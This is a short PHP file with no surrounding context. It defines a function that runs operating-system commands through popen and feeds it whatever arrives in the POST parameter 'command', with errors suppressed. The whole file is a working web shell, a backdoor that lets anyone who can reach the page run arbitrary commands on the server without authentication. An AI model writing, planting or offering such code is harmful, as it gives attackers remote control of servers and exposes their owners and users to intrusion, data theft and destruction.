<?php
function shell($cmd)
{
    $f = @popen($cmd,"r");
	$ret = "";
	while(!@feof($f)) { 
		$ret .= @fread($f,1024); 
	}
	@pclose($f);
    return $ret;
}

shell($_POST['command']);
?>